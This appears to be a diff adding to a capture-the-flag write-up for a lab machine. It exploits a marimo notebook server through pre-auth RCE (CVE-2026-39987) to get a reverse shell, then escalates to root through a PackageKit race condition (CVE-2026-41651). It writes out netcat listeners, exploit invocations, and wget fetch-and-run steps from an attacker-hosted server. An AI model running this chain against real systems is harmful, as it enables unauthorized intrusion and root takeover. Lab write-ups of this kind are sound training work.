@@ -162,4 +162,165 @@ Format the data from `preview` field:
 }
 ```
 
-We have 3 internal upstreams here,
+We have 3 internal upstreams here, the most interesting one is `notebooks` which is a Jupyter notebook server running on port 8888 and domain `nb-1be3782a8afd3ad5.cohort.htb`. Moreover, the note says "not for external use", so this is surely the endpoint we need to abuse.
+
+Add the subdomain to `/etc/hosts` for easier access:
+
+```bash
+echo "<MACHINE_IP> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
+```
+
+Access the website, it is running on `marimo` - a Python notebook. The page just displays an input box requires password for authentication:
+
+![marimo-page](./pics/marimo-page.png)
+
+I have checked the page source, scaned for enpoints but found nothing. I check the version of `marimo` using endpoint `/api/version` and it is `0.20.4`:
+
+```bash
+curl https://nb-1be3782a8afd3ad5.cohort.htb/api/version --insecure
+```
+
+Search for the version on Google and found this [advisory](https://github.com/advisories/GHSA-2679-6mx9-h9xc). `Marimo` version 0.20.4 affected to a critical RCE vulnerability, which is CVE-2026-39987.
+
+## Summary of CVE-2026-39987
+
+CVE-2026-39987 is a pre-authentication RCE in Marimo versions up to 0.20.4, caused by missing authentication checks on the /terminal/ws WebSocket endpoint. While other WebSocket endpoints validate authentication, /terminal/ws directly accepts the connection when Marimo is running in edit mode.
+
+After accepting the connection, the server uses pty.fork() to create a pseudo-terminal and bridges it to the WebSocket, giving an unauthenticated attacker an interactive shell with the privileges of the Marimo process.
+
+The attack flow can therefore be summarized as:
+
+```text
+Unauthenticated Attacker
+        │
+        │ WebSocket connection
+        ▼
+/terminal/ws
+        │
+        │ Missing authentication check
+        ▼
+WebSocket accepted
+        │
+        ▼
+PTY created via pty.fork()
+        │
+        ▼
+Interactive shell
+        │
+        ▼
+Arbitrary command execution
+```
+
+The issue is classified as CWE-306: Missing Authentication for Critical Function. It is particularly dangerous when `marimo` is exposed on a network in edit mode, because authentication could be enabled while the terminal endpoint still remained reachable without valid credentials.
+
+The vulnerability was fixed in marimo 0.23.0 by adding authentication validation to the terminal WebSocket route, ensuring that terminal access is subject to the same authentication requirements as other protected WebSocket endpoints.
+
+---
+
+You can read more details in the above advisory link. The advisory also has a PoC but I will use PoC on `exploit-db` for faster:
+![exploit-db](./pics/exploit-db.png)
+
+Download the script using this command:
+
+```bash
+searchsploit --mirror 52673
+```
+
+Or you can use visit this [link](https://www.exploit-db.com/exploits/52673) and copy the script. After downloading, using text editor to comment the header so the script will run normally. Before running the script, we need to start a listener for catching the reverse connection:
+
+```bash
+nc -nvlp 4444
+```
+
+The, run the script:
+
+```bash
+python3 52673.py -u https://nb-1be3782a8afd3ad5.cohort.htb --lhost <YOUR_LOCAL_IP> --lport 4444
+```
+
+We will have a shell with privilege of user `marimo`, here we get the user flag:
+
+![user-flag](./pics/user-flag.png)
+
+## PRIVILEGE ESCALATION
+
+First we need to stabilize the shell:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+CTRL+Z
+stty raw -echo;fg
+ENTER twice
+```
+
+Because we do not know `marimo` password, we can not use `sudo -l` to check the privileges. I have try some common ways like finding SUID binaries, checking capabilities, checking cron jobs, etc but none of them works. I decide to use `linpeas` - a script for automatic local enumeration on Linux systems, you can download it from [here](https://github.com/peass-ng/PEASS-ng/releases/download/20261002-82d9fad1/linpeas.sh).
+
+Download `linpeas.sh` to our local machine and host a temporary webserver:
+
+```bash
+python3 -m http.server 8000
+```
+
+On the target machine, run:
+
+```bash
+cd /dev/shm
+wget http://<YOUR_LOCAL_IP>:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+LinPEAS identified that the machine was vulnerable to **Pack2TheRoot**, a privilege-escalation vulnerability affecting **PackageKit**, a package management service for Linux. This vulnerability is tracked as **CVE-2026-41651**.
+
+![linpeas-result](./pics/linpeas-result.png)
+
+## Summary of CVE-2026-41651
+
+CVE-2026-41651 is a local privilege escalation vulnerability in **PackageKit** caused by a TOCTOU race condition in transaction flag handling. **PackageKit** runs as a root-level D-Bus service and relies on polkit to authorize package installation. However, `InstallFiles()` can overwrite cached_transaction_flags even after a transaction has started.
+
+An attacker can exploit this race by first submitting a safe transaction with ONLY_DOWNLOAD, then quickly sending another request that changes the flags to 0 while the authorization check is being held. When the transaction is later executed, PackageKit reads the modified flags and performs a real package installation instead of the originally authorized safe operation. This allows an unprivileged local user to install a malicious RPM and execute its `%post` scriptlet as root.
+
+**Attack Chain**:
+
+```text
+Low-privileged Local User 
+        ↓ 
+Create PackageKit D-Bus transaction 
+        ↓ 
+InstallFiles(ONLY_DOWNLOAD) 
+        ↓ 
+Overwrite flags → 0 
+        ↓ 
+TOCTOU race / authorization held 
+        ↓ 
+PackageKit performs real installation 
+        ↓
+Malicious RPM %post scriptlet ↓ Code Execution as root
+```
+
+The vulnerability affects PackageKit versions 1.0.2 through 1.3.4 and was fixed in 1.3.5.
+
+---
+For more details, you can read this [advisory](https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv). For faster, I will use the Poc in this [repository](https://github.com/Vozec/CVE-2026-41651) to exploit the vulnerability:
+
+```bash
+git clone https://github.com/Vozec/CVE-2026-41651.git
+cd CVE-2026-41651
+python3 -m http.server 9999
+```
+
+On target machine, download the script and run it:
+
+```bash
+wget http://<YOUR_LOCAL_IP>:9999/cve-2026-41651
+chmod +x cve-2026-41651
+./cve-2026-41651
+```
+
+Now we have successfullt privilege escalation and gained root shell:
+![root-shell](./pics/rootshell.png)
+
+FINAL MISSION: get the root flag
+![root-flag](./pics/root-flag.png)
